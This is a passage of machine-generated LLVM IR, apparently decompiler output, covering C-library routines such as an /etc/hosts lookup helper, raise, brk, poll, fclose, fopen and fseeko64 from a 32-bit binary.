  store i32 ptrtoint ([7 x i8]* @global_var_805c932.589 to i32), i32* %stack_var_-216, align 4
  %v0_8056558 = load i32, i32* @edi, align 4
  %v4_8056559 = inttoptr i32 %v0_8056558 to i8*
  %v5_8056559 = call i32 @__GI_strcoll(i8* %v4_8056559, i32 ptrtoint ([7 x i8]* @global_var_805c932.589 to i32), i32 %v0_8056551, i32 %v0_8056551)
  store i32 %v5_8056559, i32* @eax, align 4
  %v1_8056561 = icmp eq i32 %v5_8056559, 0
  br i1 %v1_8056561, label %dec_label_pc_80565a3.preheader, label %dec_label_pc_8056565

dec_label_pc_8056565:                             ; preds = %dec_label_pc_8056551
  %v0_8056565 = load i32, i32* @ecx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805c939.590 to i32), i32* %stack_var_-216, align 4
  %v0_805656c = load i32, i32* @edi, align 4
  %v4_805656d = inttoptr i32 %v0_805656c to i8*
  %v5_805656d = call i32 @__GI_strcoll(i8* %v4_805656d, i32 ptrtoint ([7 x i8]* @global_var_805c939.590 to i32), i32 %v0_8056565, i32 %v0_8056565)
  %v1_8056575 = icmp eq i32 %v5_805656d, 0
  br i1 %v1_8056575, label %dec_label_pc_80565a3.preheader, label %dec_label_pc_80565e6.backedge

dec_label_pc_80565a3.preheader:                   ; preds = %dec_label_pc_8056551, %dec_label_pc_8056565
  %v0_80565a392 = load i32, i32* @global_var_8063b38.583, align 8
  %tmp4594 = icmp slt i32 %v0_80565a392, 1
  %tmp4695 = icmp eq i1 %tmp4594, false
  br i1 %tmp4695, label %dec_label_pc_805657b, label %dec_label_pc_80565ac

dec_label_pc_805657b:                             ; preds = %dec_label_pc_80565a3.preheader, %dec_label_pc_805657b.dec_label_pc_805657b_crit_edge
  %v0_80565a396 = phi i32 [ %v0_80565a3, %dec_label_pc_805657b.dec_label_pc_805657b_crit_edge ], [ %v0_80565a392, %dec_label_pc_80565a3.preheader ]
  %v1_805657b = add i32 %v0_80565a396, -1
  store i32 %v1_805657b, i32* @global_var_8063b38.583, align 8
  %v1_8056584 = mul i32 %v1_805657b, 4
  %v2_8056584 = add i32 %v1_8056584, 134626072
  %v3_8056584 = inttoptr i32 %v2_8056584 to i32*
  %v4_8056584 = load i32, i32* %v3_8056584, align 4
  %v1_805658b = call i32 @free(i32 %v4_8056584)
  %v0_8056590 = load i32, i32* @global_var_8063b38.583, align 8
  %v1_8056598 = mul i32 %v0_8056590, 4
  %v2_8056598 = add i32 %v1_8056598, ptrtoint (i32* @global_var_8063b18.591 to i32)
  %v3_8056598 = inttoptr i32 %v2_8056598 to i32*
  store i32 0, i32* %v3_8056598, align 4
  %v0_80565a3 = load i32, i32* @global_var_8063b38.583, align 8
  %tmp45 = icmp slt i32 %v0_80565a3, 1
  %tmp46 = icmp eq i1 %tmp45, false
  br i1 %tmp46, label %dec_label_pc_805657b.dec_label_pc_805657b_crit_edge, label %dec_label_pc_80565ac

dec_label_pc_805657b.dec_label_pc_805657b_crit_edge: ; preds = %dec_label_pc_805657b
  br label %dec_label_pc_805657b

dec_label_pc_80565ac:                             ; preds = %dec_label_pc_805657b, %dec_label_pc_80565a3.preheader
  %v0_80565a3.lcssa = phi i32 [ %v0_80565a392, %dec_label_pc_80565a3.preheader ], [ %v0_80565a3, %dec_label_pc_805657b ]
  store i32 1, i32* @esi, align 4
  %v5_80565d9100 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_80565d9100, label %dec_label_pc_80565db, label %dec_label_pc_80565e6.backedge

dec_label_pc_80565b3:                             ; preds = %dec_label_pc_80565db
  %v2_80565b6 = mul i32 %v1_80565b6102, 4
  %v4_80565b6 = add i32 %v2_80565b6, %v3_8056521
  %v5_80565b6 = inttoptr i32 %v4_80565b6 to i32*
  %v6_80565b6 = load i32, i32* %v5_80565b6, align 4
  %v1_80565bd = inttoptr i32 %v6_80565b6 to i8*
  %v2_80565bd = call i32 @__GI_strdup(i8* %v1_80565bd)
  %v0_80565c2 = load i32, i32* @esi, align 4
  %v1_80565c2 = add i32 %v0_80565c2, 1
  store i32 %v1_80565c2, i32* @esi, align 4
  %v1_80565c3 = load i32, i32* @ebx, align 4
  %v2_80565c3 = mul i32 %v1_80565c3, 4
  %v3_80565c3 = add i32 %v2_80565c3, 134626072
  %v4_80565c3 = inttoptr i32 %v3_80565c3 to i32*
  store i32 %v2_80565bd, i32* %v4_80565c3, align 4
  %v0_80565ca = load i32, i32* @ebx, align 4
  %v1_80565ca = add i32 %v0_80565ca, 1
  store i32 %v1_80565ca, i32* @global_var_8063b38.583, align 8
  %v0_80565d5.pre = load i32, i32* @esi, align 4
  %v5_80565d9 = icmp slt i32 %v0_80565d5.pre, %stack_var_-196.0.lcssa
  br i1 %v5_80565d9, label %dec_label_pc_80565db, label %dec_label_pc_80565e6.backedge

dec_label_pc_80565db:                             ; preds = %dec_label_pc_80565ac, %dec_label_pc_80565b3
  %v1_80565b6102 = phi i32 [ %v0_80565d5.pre, %dec_label_pc_80565b3 ], [ 1, %dec_label_pc_80565ac ]
  %v0_80565db101 = phi i32 [ %v1_80565ca, %dec_label_pc_80565b3 ], [ %v0_80565a3.lcssa, %dec_label_pc_80565ac ]
  store i32 %v0_80565db101, i32* @ebx, align 4
  %v7_80565e4 = icmp sgt i32 %v0_80565db101, 3
  br i1 %v7_80565e4, label %dec_label_pc_80565e6.backedge, label %dec_label_pc_80565b3

dec_label_pc_8056473.preheader:                   ; preds = %dec_label_pc_8056473.preheader.lr.ph, %dec_label_pc_80565e6.backedge
  %v0_8056473.pre = load i32, i32* @ebx, align 4
  %v4_8056473.pre = load i32, i32* @ecx, align 4
  %v1_805647351 = inttoptr i32 %v0_8056473.pre to i8*
  %v2_805647352 = load i8, i8* %v1_805647351, align 1
  %v3_805647353 = zext i8 %v2_805647352 to i32
  %v5_805647354 = and i32 %v4_8056473.pre, -256
  %v6_805647355 = or i32 %v3_805647353, %v5_805647354
  store i32 %v6_805647355, i32* @ecx, align 4
  %v4_805647556 = icmp eq i8 %v2_805647352, 0
  br i1 %v4_805647556, label %dec_label_pc_80565e6.backedge, label %dec_label_pc_805647d.lr.ph

dec_label_pc_805647d.lr.ph:                       ; preds = %dec_label_pc_8056473.preheader
  %v0_8056480.pre = load i32, i32* @global_var_805d1e8, align 8
  br label %dec_label_pc_805647d

dec_label_pc_8056602:                             ; preds = %dec_label_pc_80565e6.backedge, %dec_label_pc_80565e6.preheader
  %v0_8056605 = load i32, i32* @ebp, align 4
  %v1_8056606 = inttoptr i32 %v0_8056605 to i16*
  %v2_8056606 = call i32 @__GI_fclose(i16* %v1_8056606)
  br label %dec_label_pc_805661b

dec_label_pc_8056610:                             ; preds = %dec_label_pc_805644f
  %v0_8056610 = call i32 @__GI___h_errno_location()
  %v1_8056615 = inttoptr i32 %v0_8056610 to i32*
  store i32 3, i32* %v1_8056615, align 4
  br label %dec_label_pc_805661b

dec_label_pc_805661b:                             ; preds = %entry, %dec_label_pc_8056602, %dec_label_pc_8056610
  store i32 1, i32* %stack_var_-216, align 4
  store i32 %v2_8056408, i32* @eax, align 4
  %v2_8056627 = call i32 @__pthread_return_void(i32 %v2_8056408, i32 1)
  store i32 %v0_80563f4, i32* @ebp, align 4
  ret i32 %v2_8056627

; uselistorder directives
  uselistorder i32 %v0_8056480.pre, { 1, 0 }
  uselistorder i32 %v6_805647355, { 1, 0 }
  uselistorder i8 %v2_805647352, { 1, 2, 0 }
  uselistorder i8* %v1_805647351, { 1, 0 }
  uselistorder i32 %v0_8056473.pre, { 1, 0 }
  uselistorder i32 %v0_80565a3, { 0, 2, 1 }
  uselistorder i32 %v1_805657b, { 1, 0 }
  uselistorder i32 %v0_8056546, { 1, 0 }
  uselistorder i32 %v0_8056540.pre, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.lcssa, { 3, 1, 2, 0 }
  uselistorder i32 %stack_var_-196.013, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_80564d9, { 1, 0 }
  uselistorder i8 %v2_80564d383, { 1, 0 }
  uselistorder i32 %v2_80564ba, { 1, 0 }
  uselistorder i8 %v2_80564b468, { 1, 0 }
  uselistorder i32 %v1_80564b3, { 0, 2, 1, 3 }
  uselistorder i32 %v2_805647d, { 1, 0 }
  uselistorder i32 %v1_8056472, { 1, 0, 2 }
  uselistorder i32 %v2_80565ed, { 2, 3, 0, 1 }
  uselistorder i32 %v2_805645b, { 1, 0 }
  uselistorder i32 %v2_805643d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-216, { 1, 3, 4, 5, 2, 0, 6, 7, 9, 8 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 ()* @__GI___h_errno_location, { 6, 5, 4, 3, 0, 2, 1 }
  uselistorder i32* @global_var_8063b38.583, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 152, { 2, 1, 3, 4, 0 }
  uselistorder i32 164, { 2, 1, 0 }
  uselistorder i32* @global_var_8063b34.519, { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_805d448.518 to i32), { 1, 3, 4, 5, 6, 7, 8, 0, 2, 9 }
  uselistorder label %dec_label_pc_805661b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8056473.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80565db, { 1, 0 }
  uselistorder label %dec_label_pc_805657b, { 1, 0 }
  uselistorder label %dec_label_pc_80565a3.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8056551, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8056546, { 1, 0 }
  uselistorder label %dec_label_pc_80564fc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80564f5, { 1, 0 }
  uselistorder label %dec_label_pc_80564ec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80564d9, { 1, 0 }
  uselistorder label %dec_label_pc_80564ba, { 1, 0 }
  uselistorder label %dec_label_pc_80565e6.backedge, { 0, 3, 4, 2, 7, 6, 5, 1 }
  uselistorder label %dec_label_pc_80565e6.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v9_805665b = inttoptr i32 %arg3 to i32*
  %v10_805665b = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_805665b, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7)
  ret i32 %v10_805665b
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8056667 = call i32 @__libc_getpid()
  %v2_8056673 = call i32 @kill(i32 %v0_8056667, i32 %arg1)
  ret i32 %v2_8056673

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 0, 3, 2, 1 }
  uselistorder i32 ()* @__libc_getpid, { 0, 3, 2, 1 }
}

define i32 @_dl_aux_init() local_unnamed_addr {
entry:
  %v0_805667c = load i32, i32* @eax, align 4
  %v1_805667c = add i32 %v0_805667c, 28
  %v2_805667c = inttoptr i32 %v1_805667c to i32*
  %v3_805667c = load i32, i32* %v2_805667c, align 4
  store i32 %v3_805667c, i32* @global_var_8063b3c.592, align 4
  %v1_8056685 = add i32 %v0_805667c, 44
  %v2_8056685 = inttoptr i32 %v1_8056685 to i32*
  %v3_8056685 = load i32, i32* %v2_8056685, align 4
  store i32 %v3_8056685, i32* @global_var_8063b40.593, align 64
  ret i32 %v3_8056685
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8056690 = load i32, i32* @ebx, align 4
  store i32 %v0_8056690, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_80566a3 = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_80566a3, i32* @global_var_8063704.570, align 4
  %v7_80566ae = icmp ult i32 %v1_80566a3, %arg1
  %v1_80566b0 = icmp eq i1 %v7_80566ae, false
  br i1 %v1_80566b0, label %dec_label_pc_80566c0, label %dec_label_pc_80566b2

dec_label_pc_80566b2:                             ; preds = %entry
  %v0_80566b2 = load i32, i32* %stack_var_-4, align 4
  %v1_80566b2 = call i32 @__errno_location(i32 %v0_80566b2)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_80566ba = inttoptr i32 %v1_80566b2 to i32*
  store i32 12, i32* %v1_80566ba, align 4
  %v0_80566c0.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80566c0

dec_label_pc_80566c0:                             ; preds = %entry, %dec_label_pc_80566b2
  %v0_80566c0 = phi i32 [ 0, %entry ], [ %v0_80566c0.pre, %dec_label_pc_80566b2 ]
  %v2_80566c4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80566c4, i32* @ebx, align 4
  ret i32 %v0_80566c0

; uselistorder directives
  uselistorder i32 %v1_80566a3, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32* @global_var_8063704.570, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80566c0, { 1, 0 }
}

define i32 @__libc_poll() local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_80566c8 = load i32, i32* @edi, align 4
  store i32 %v0_80566c8, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %edi.global-to-local, align 4
  %v0_80566d8 = load i32, i32* @ebx, align 4
  %v1_80566d9 = inttoptr i32 %tmp4 to %pollfd*
  %v5_80566e0 = call i32 @poll(%pollfd* %v1_80566d9, i32 %tmp3, i32 %tmp)
  store i32 %v0_80566d8, i32* @ebx, align 4
  store i32 %v5_80566e0, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v5_80566e0, -4095
  br i1 %tmp10, label %dec_label_pc_80566f8, label %dec_label_pc_80566ec

dec_label_pc_80566ec:                             ; preds = %entry
  %v1_80566ec = call i32 @__errno_location(i32 %v0_80566d8)
  %v0_80566f1 = load i32, i32* %edi.global-to-local, align 4
  %v1_80566f1 = sub i32 0, %v0_80566f1
  %v2_80566f3 = inttoptr i32 %v1_80566ec to i32*
  store i32 %v1_80566f1, i32* %v2_80566f3, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80566f8

dec_label_pc_80566f8:                             ; preds = %entry, %dec_label_pc_80566ec
  %v0_80566f8 = phi i32 [ %v5_80566e0, %entry ], [ -1, %dec_label_pc_80566ec ]
  %v2_80566fc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80566fc, i32* @edi, align 4
  ret i32 %v0_80566f8

; uselistorder directives
  uselistorder i32 %v5_80566e0, { 1, 0, 2 }
  uselistorder i32 %v0_80566d8, { 1, 0 }
  uselistorder label %dec_label_pc_80566f8, { 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v4_8056707 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8056707, i32* @esi, align 4
  %v1_805670b = add i32 %v4_8056707, 52
  %v2_805670b = inttoptr i32 %v1_805670b to i32*
  %v3_805670b = load i32, i32* %v2_805670b, align 4
  store i32 %v3_805670b, i32* @ebp, align 4
  %v1_805670e = icmp eq i32 %v3_805670b, 0
  %v1_8056710 = icmp eq i1 %v1_805670e, false
  br i1 %v1_8056710, label %dec_label_pc_8056731, label %dec_label_pc_8056712

dec_label_pc_8056712:                             ; preds = %entry
  %v1_8056712 = add i32 %v4_8056707, 56
  store i32 %v1_8056712, i32* @ebx, align 4
  %v2_805671c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805671c, i32* @eax, align 4
  %v2_8056721 = call i32 @__pthread_return_void(i32 %v2_805671c, i32 134564459)
  %v0_8056726 = load i32, i32* @ebx, align 4
  %v1_8056729 = call i32 @__pthread_return_0(i32 %v0_8056726)
  store i32 %v1_8056729, i32* @eax, align 4
  %v0_8056733.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8056731

dec_label_pc_8056731:                             ; preds = %entry, %dec_label_pc_8056712
  %v0_805673b = phi i32 [ %v4_8056707, %entry ], [ %v0_8056733.pre, %dec_label_pc_8056712 ]
  store i32 0, i32* @edi, align 4
  %v1_8056733 = inttoptr i32 %v0_805673b to i8*
  %v2_8056733 = load i8, i8* %v1_8056733, align 1
  %v3_8056733 = and i8 %v2_8056733, 64
  %v4_8056733 = icmp eq i8 %v3_8056733, 0
  br i1 %v4_8056733, label %dec_label_pc_8056731.dec_label_pc_8056746_crit_edge, label %dec_label_pc_8056738

dec_label_pc_8056731.dec_label_pc_8056746_crit_edge: ; preds = %dec_label_pc_8056731
  br label %dec_label_pc_8056746

dec_label_pc_8056738:                             ; preds = %dec_label_pc_8056731
  %v1_805673c = inttoptr i32 %v0_805673b to i16*
  %v2_805673c = call i32 @fflush_unlocked(i16* %v1_805673c)
  store i32 %v2_805673c, i32* @edi, align 4
  %v0_8056749.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8056746

dec_label_pc_8056746:                             ; preds = %dec_label_pc_8056731.dec_label_pc_8056746_crit_edge, %dec_label_pc_8056738
  %v0_8056749 = phi i32 [ %v0_805673b, %dec_label_pc_8056731.dec_label_pc_8056746_crit_edge ], [ %v0_8056749.pre, %dec_label_pc_8056738 ]
  %v1_8056749 = add i32 %v0_8056749, 4
  %v2_8056749 = inttoptr i32 %v1_8056749 to i32*
  %v3_8056749 = load i32, i32* %v2_8056749, align 4
  %v1_805674c = call i32 @__libc_close(i32 %v3_8056749)
  store i32 %v1_805674c, i32* @eax, align 4
  %v2_8056754 = icmp slt i32 %v1_805674c, 0
  %v1_8056756 = icmp eq i1 %v2_8056754, false
  br i1 %v1_8056756, label %dec_label_pc_805675b, label %dec_label_pc_8056758

dec_label_pc_8056758:                             ; preds = %dec_label_pc_8056746
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_805675b

dec_label_pc_805675b:                             ; preds = %dec_label_pc_8056746, %dec_label_pc_8056758
  %v0_805675b = load i32, i32* @esi, align 4
  %v1_805675b = add i32 %v0_805675b, 4
  %v2_805675b = inttoptr i32 %v1_805675b to i32*
  store i32 -1, i32* %v2_805675b, align 4
  %v2_805676d = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_805676d, i32* @ebx, align 4
  %v2_8056772 = call i32 @__pthread_return_void(i32 %v2_805676d, i32 134564459)
  %v1_805677e = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805d224.488 to i32))
  %v0_8056783 = load i32, i32* @global_var_80614a4.594, align 4
  %v1_8056788 = add i32 %v0_8056783, 1
  store i32 %v1_8056788, i32* @global_var_80614a4.594, align 4
  store i32 ptrtoint (i32* @global_var_805d224.488 to i32), i32* @eax, align 4
  %v2_8056793 = call i32 @__pthread_return_void(i32 %v2_805676d, i32 1)
  store i32 %v2_8056793, i32* @eax, align 4
  %v0_805679b = load i32, i32* @esi, align 4
  %v1_805679b = inttoptr i32 %v0_805679b to i16*
  %v2_805679b = load i16, i16* %v1_805679b, align 2
  %v3_805679b = and i16 %v2_805679b, 24576
  store i16 %v3_805679b, i16* %v1_805679b, align 2
  %v0_80567a0 = load i32, i32* @esi, align 4
  %v1_80567a0 = inttoptr i32 %v0_80567a0 to i16*
  %v2_80567a0 = load i16, i16* %v1_80567a0, align 2
  %v3_80567a0 = or i16 %v2_80567a0, 48
  store i16 %v3_80567a0, i16* %v1_80567a0, align 2
  br i1 %v1_8056710, label %dec_label_pc_80567b9, label %dec_label_pc_80567a8

dec_label_pc_80567a8:                             ; preds = %dec_label_pc_805675b
  %v2_80567ac = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80567ac, i32* @eax, align 4
  %v2_80567b1 = call i32 @__pthread_return_void(i32 %v2_80567ac, i32 1)
  store i32 %v2_80567b1, i32* @eax, align 4
  br label %dec_label_pc_80567b9

dec_label_pc_80567b9:                             ; preds = %dec_label_pc_805675b, %dec_label_pc_80567a8
  %v0_80567b9 = load i32, i32* @esi, align 4
  %v1_80567b9 = add i32 %v0_80567b9, 1
  %v2_80567b9 = inttoptr i32 %v1_80567b9 to i8*
  %v3_80567b9 = load i8, i8* %v2_80567b9, align 1
  %v4_80567b9 = and i8 %v3_80567b9, 64
  %v5_80567b9 = icmp eq i8 %v4_80567b9, 0
  br i1 %v5_80567b9, label %dec_label_pc_80567cd, label %dec_label_pc_80567bf

dec_label_pc_80567bf:                             ; preds = %dec_label_pc_80567b9
  %v1_80567c2 = add i32 %v0_80567b9, 8
  %v2_80567c2 = inttoptr i32 %v1_80567c2 to i32*
  %v3_80567c2 = load i32, i32* %v2_80567c2, align 4
  %v1_80567c5 = call i32 @free(i32 %v3_80567c2)
  store i32 %v1_80567c5, i32* @eax, align 4
  br label %dec_label_pc_80567cd

dec_label_pc_80567cd:                             ; preds = %dec_label_pc_80567b9, %dec_label_pc_80567bf
  %v2_80567d9 = call i32 @__pthread_return_void(i32 %v2_805676d, i32 134564459)
  %v1_80567e5 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805d224.488 to i32))
  store i32 ptrtoint (i32* @global_var_805d224.488 to i32), i32* @eax, align 4
  %v0_80567ec = load i32, i32* @global_var_80614a8.595, align 8
  %v1_80567ec = add i32 %v0_80567ec, 1
  store i32 %v1_80567ec, i32* @global_var_80614a8.595, align 8
  %v2_80567f5 = call i32 @__pthread_return_void(i32 %v2_805676d, i32 1)
  %v0_80567fa = call i32 @_stdio_openlist_dec_use()
  %v0_8056802 = load i32, i32* @edi, align 4
  ret i32 %v0_8056802

; uselistorder directives
  uselistorder i32 (i32)* @__libc_close, { 17, 16, 15, 14, 33, 32, 31, 13, 12, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80567cd, { 1, 0 }
  uselistorder label %dec_label_pc_80567b9, { 1, 0 }
  uselistorder label %dec_label_pc_805675b, { 1, 0 }
  uselistorder label %dec_label_pc_8056746, { 1, 0 }
  uselistorder label %dec_label_pc_8056731, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_805681b = inttoptr i32 %arg2 to i8*
  %v5_805681b = call i32 @_stdio_fopen(i32 %arg1, i8* %v4_805681b, i32 0, i32 -1)
  ret i32 %v5_805681b
}

define i32 @__GI_fseek(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_805682f = ashr i32 %arg2, 31
  %v4_8056836 = inttoptr i32 %arg1 to i16*
  %v5_8056836 = call i32 @__GI_fseeko64(i16* %v4_8056836, i32 %arg2, i32 %v1_805682f, i32 %arg3)
  ret i32 %v5_8056836
}

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8056840 = load i32, i32* @ebp, align 4
  %v0_8056841 = load i32, i32* @edi, align 4
  %v0_8056842 = load i32, i32* @esi, align 4
  %v0_8056843 = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @edi, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v4_8056853 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8056853, i32* @esi, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  %tmp29 = icmp ult i32 %arg4, 3
  br i1 %tmp29, label %dec_label_pc_8056877, label %dec_label_pc_8056864

dec_label_pc_8056864:                             ; preds = %entry
  %v1_8056864 = call i32 @__errno_location(i32 %arg2)
  store i32 %v1_8056864, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v1_805686c = inttoptr i32 %v1_8056864 to i32*
  store i32 22, i32* %v1_805686c, align 4
  br label %dec_label_pc_8056919

dec_label_pc_8056877:                             ; preds = %entry
  %v1_8056877 = add i32 %v4_8056853, 52
  %v2_8056877 = inttoptr i32 %v1_8056877 to i32*
  %v3_8056877 = load i32, i32* %v2_8056877, align 4
  %v1_805687a = icmp eq i32 %v3_8056877, 0
  %v1_805687c = icmp eq i1 %v1_805687a, false
  br i1 %v1_805687c, label %dec_label_pc_805689d, label %dec_label_pc_805687e

dec_label_pc_805687e:                             ; preds = %dec_label_pc_8056877
  %v1_805687e = add i32 %v4_8056853, 56
  store i32 %v1_805687e, i32* @ebx, align 4
  %v2_8056888 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8056888, i32* @eax, align 4
  %v3_805688d = call i32 @__pthread_return_void(i32 %v2_8056888, i32 134564459)
  store i32 %v3_805688d, i32* %eax.global-to-local, align 4
  %v0_8056892 = load i32, i32* @ebx, align 4
  %v2_8056895 = call i32 @__pthread_return_0(i32 %v0_8056892)
  store i32 %v2_8056895, i32* %eax.global-to-local, align 4
  %v0_805689d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805689d

dec_label_pc_805689d:                             ; preds = %dec_label_pc_8056877, %dec_label_pc_805687e
  %v0_80568a5 = phi i32 [ %v4_8056853, %dec_label_pc_8056877 ], [ %v0_805689d.pre, %dec_label_pc_805687e ]
  %v1_805689d = inttoptr i32 %v0_80568a5 to i8*
  %v2_805689d = load i8, i8* %v1_805689d, align 1
  %v3_805689d = and i8 %v2_805689d, 64
  %v4_805689d = icmp eq i8 %v3_805689d, 0
  br i1 %v4_805689d, label %dec_label_pc_80568b2, label %dec_label_pc_80568a2

dec_label_pc_80568a2:                             ; preds = %dec_label_pc_805689d
  %v2_80568a6 = call i32 @__stdio_wcommit(i32 %v0_80568a5)
  store i32 %v2_80568a6, i32* %eax.global-to-local, align 4
  %v1_80568ae = icmp eq i32 %v2_80568a6, 0
  %v1_80568b0 = icmp eq i1 %v1_80568ae, false
  br i1 %v1_80568b0, label %dec_label_pc_8056901, label %dec_label_pc_80568b2

dec_label_pc_80568b2:                             ; preds = %dec_label_pc_80568a2, %dec_label_pc_805689d
  %v0_80568b2 = load i32, i32* @edi, align 4
  %v9_80568b2 = icmp eq i32 %v0_80568b2, 1
  %v1_80568b5 = icmp eq i1 %v9_80568b2, false
  br i1 %v1_80568b5, label %dec_label_pc_80568b2.dec_label_pc_80568cb_crit_edge, label %dec_label_pc_80568b7

dec_label_pc_80568b2.dec_label_pc_80568cb_crit_edge: ; preds = %dec_label_pc_80568b2
  %.pre7 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_80568cb

dec_label_pc_80568b7:                             ; preds = %dec_label_pc_80568b2
  %v0_80568b7 = load i32, i32* @ecx, align 4
  %v2_80568b9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_80568b9, i32* %eax.global-to-local, align 4
  %v0_80568be = load i32, i32* @esi, align 4
  %tmp27 = inttoptr i32 %v0_80568be to i32*
  %v6_80568bf = call i32 @__stdio_adjust_position(i32* %tmp27, i32 %v2_80568b9, i32 %v0_80568b7, i32 %v0_80568b7)
  store i32 %v6_80568bf, i32* %eax.global-to-local, align 4
  %v2_80568c7 = icmp slt i32 %v6_80568bf, 0
  br i1 %v2_80568c7, label %dec_label_pc_8056901, label %dec_label_pc_80568b7.dec_label_pc_80568cb_crit_edge

dec_label_pc_80568b7.dec_label_pc_80568cb_crit_edge: ; preds = %dec_label_pc_80568b7
  %v0_80568cc.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80568cb

dec_label_pc_80568cb:                             ; preds = %dec_label_pc_80568b2.dec_label_pc_80568cb_crit_edge, %dec_label_pc_80568b7.dec_label_pc_80568cb_crit_edge
  %v2_80568cd.pre-phi = phi i32 [ %.pre7, %dec_label_pc_80568b2.dec_label_pc_80568cb_crit_edge ], [ %v2_80568b9, %dec_label_pc_80568b7.dec_label_pc_80568cb_crit_edge ]
  %v0_80568cc = phi i32 [ %v0_80568b2, %dec_label_pc_80568b2.dec_label_pc_80568cb_crit_edge ], [ %v0_80568cc.pre, %dec_label_pc_80568b7.dec_label_pc_80568cb_crit_edge ]
  %v0_80568cb = load i32, i32* @edx, align 4
  store i32 %v2_80568cd.pre-phi, i32* %eax.global-to-local, align 4
  %v0_80568d2 = load i32, i32* @esi, align 4
  %v5_80568d3 = inttoptr i32 %v2_80568cd.pre-phi to i32*
  %v6_80568d3 = call i32 @__stdio_seek(i32 %v0_80568d2, i32* %v5_80568d3, i32 %v0_80568cc, i32 %v0_80568cb)
  store i32 %v6_80568d3, i32* %eax.global-to-local, align 4
  %v2_80568db = icmp slt i32 %v6_80568d3, 0
  br i1 %v2_80568db, label %dec_label_pc_8056901, label %dec_label_pc_80568df

dec_label_pc_80568df:                             ; preds = %dec_label_pc_80568cb
  %v0_80568df = load i32, i32* @esi, align 4
  %v1_80568df = inttoptr i32 %v0_80568df to i16*
  %v2_80568df = load i16, i16* %v1_80568df, align 2
  %v3_80568df = and i16 %v2_80568df, -72
  store i16 %v3_80568df, i16* %v1_80568df, align 2
  %v0_80568e3 = load i32, i32* @esi, align 4
  %v1_80568e3 = add i32 %v0_80568e3, 8
  %v2_80568e3 = inttoptr i32 %v1_80568e3 to i32*
  %v3_80568e3 = load i32, i32* %v2_80568e3, align 4
